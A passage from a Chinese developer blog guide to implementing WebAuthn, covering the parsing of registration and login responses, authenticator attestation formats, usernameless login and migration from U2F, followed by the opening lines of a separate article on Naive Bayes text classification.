为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) 